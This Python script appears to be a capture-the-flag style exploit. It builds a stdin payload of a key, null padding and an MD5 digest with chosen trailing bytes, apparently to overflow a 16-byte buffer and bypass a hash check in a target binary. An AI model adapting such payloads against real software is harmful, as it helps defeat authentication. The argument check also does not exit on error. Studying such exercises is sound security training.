#!/usr/bin/python

import sys
import random
import string
import hashlib
from subprocess import Popen, PIPE

KEY_SIZE = 16   # bytes

FIND_HASH = False
EXPLOIT_KEY = 'FQ3hQntC'
EXPLOIT_HASH = b'\xfe\x91p\xf7\xb6\xa7u\x9e\x11Q\xa3\xea\xcf\x00\x91\xeb'

LAST_BYTES = b'\x00\x91\xeb'
STRING_CHOICE = string.ascii_uppercase + string.ascii_lowercase + string.digits
RANDOM_STR_SIZE = 4


def find_hash():
    value, hash = None, None

    while not value:
        random_str = ''.join(random.choice(STRING_CHOICE) for _ in range(RANDOM_STR_SIZE))
        md5 = hashlib.md5(bytearray(map(ord, random_str))).digest()

        if md5.endswith(LAST_BYTES):
            value = random_str
            hash = md5

    return (value, hash)

def build_exploit(key, hash):
    padding = b'\00' * (KEY_SIZE - len(key))
    return bytes(key, 'utf-8') + padding + hash


if len(sys.argv) < 2:
    print('File to exploit is required as second argument.', file=sys.stderr)

this, target = sys.argv
hash_found = False
key, hash = None, None
exploit = build_exploit(EXPLOIT_KEY, EXPLOIT_HASH)

if FIND_HASH:
    key, hash = find_hash()
    exploit = build_exploit(key, hash)

# Execute the target program
# print('Executing {} with STDIN:'.format(target), exploit)
p = Popen(target, stdin=PIPE)
p.communicate(exploit)

